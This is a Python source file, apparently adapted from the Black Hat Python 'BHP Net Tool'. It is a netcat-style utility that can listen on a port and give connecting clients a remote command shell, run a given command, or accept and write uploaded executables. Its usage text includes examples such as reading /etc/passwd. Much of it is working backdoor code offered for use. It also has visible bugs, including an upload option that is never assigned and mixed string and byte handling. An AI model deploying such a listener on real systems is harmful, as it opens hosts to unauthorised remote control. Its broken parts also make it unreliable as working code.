import sys
import socket
import getopt
import threading
import subprocess

# define globals
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


# function to handle CLI arguments
def usage():

    explanation = """  BHP Net Tool
    
                Usage: bhpnet.py -t target_host -p port
                -l --listen              - listen on [host]:[port] for incoming connections
                -e --execute=file_to_run - execute the given file upon receiving a connection
                -c --command             - initialize a command shell
                -u --upload=destination  - upon receiving connection upload a file and write to [destination]
                
                Examples:
                bhpnet.py -t 182.168.0.1 -p 5555 -l -c
                bhpnet.py -t 182.168.0.1 -p 5555 -l -u=c:\\target.exe
                bhpnet.py -t 182.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"""
                echo 'ABCD' | ./bhpnet.py -t 192.168.11.12 -p 135
    """

    print(explanation)


def read_cli_options():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])

        return opts, args
    except getopt.GetoptError as error:
        print(str(error))
        usage()


def client_sender(buffer):

    # AF_INET means IPv4 address
    # SOCK_STREAM means TCP client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to target host
        client.connect((target, port))
        print("[*] Connected to %s on port %d" % (target, port))

        # Test to see if any input from stdin
        if len(buffer):
            client.send(buffer)

        # now we need to wait for our data to come back
        while True:

            recv_len = 1
            response = ""

            while recv_len:

                # Max data size of 4096
                data = client.recv(4096)
                recv_len = len(data)
                response += str(data)

                # if we receive less than 4096 bytes, stop receiving
                if recv_len < 4096:
                    break

            print(response)

            # Wait for more input
            buffer = input("")
            buffer += "\n"

            # Convert buffer string to bytes object
            buffer = buffer.encode()

            # send it away
            client.send(buffer)

    except socket.error as err:
        print("[*] Exception! Exiting with error: %s" % err)

        # tear down the connection
        client.close()


# Primary server loop
def server_loop():
    global target

    # if no target is defined, listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    # AF_INET means IPv4 address
    # SOCK_STREAM means TCP client
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    # Tell with a max number of 5 queued connections
    server.listen(5)

    while True:
        # store the client socket and the addr from the server
        client_socket, addr = server.accept()

        # Create a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


# Logic for file uploads, command execution, shell
def client_handler(client_socket):
    global upload
    global execute
    global command

    # Make sure we can receive a file when we get a connection
    # Check for an upload
    if len(upload_destination):
        # Read in all the bytes and write to the destination
        file_buffer = ""

        # Keep reading data until none is available
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # Write the bytes out
        try:
            # wb means we are writing with binary mode enabled so that we can upload a binary executable
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # Inform user that the file was written
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)

        except:
            client_socket.send("Failed to write the file to %s\r\n" % upload_destination)

    # Check for command line execution
    if len(execute):
        # Run the command
        output = run_command(execute)

        client_socket.send(output)

    # If a command shell was requested, go to another loop
    if command:

        while True:
            client_socket.send(b"hello")
            # Show a prompt
            client_socket.send(b"<BHP:#> ")

            # Keep receiving until we receive a line
            cmd_buffer = ""

            while '\n' not in cmd_buffer:
                print("Received the command %s" % cmd_buffer)
                cmd_buffer += str(client_socket.recv(1024))

            # Run the command
            response = run_command(cmd_buffer)
            print("Your command is %s" % cmd_buffer)

            # Send back the response
            client_socket.send(response)


# Stub function to handle comment execution and full command shell
def run_command(command):
    # Trim the newline
    command = command.rstrip()

    print("[*] Running the command %s" % command)

    # Run whatever the command we pass in and see what the output is
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command\r\n"

    # Send output back to client
    return output



def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # Read CLI options
    opts, args = read_cli_options()

    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # Mimic Netcat to read data from stdin and send it across the network.
    # If we are not listening and just sending data
    if not listen and len(target) and port > 0:

        # read buffer from CLI
        # Send CTRL-D if not sending input to stdin
        buffer = sys.stdin.read()

        # send the data
        client_sender(buffer)

    # if we are listening, we may need to upload things, execute commands, drop a shell back
    if listen:
        server_loop()


main()
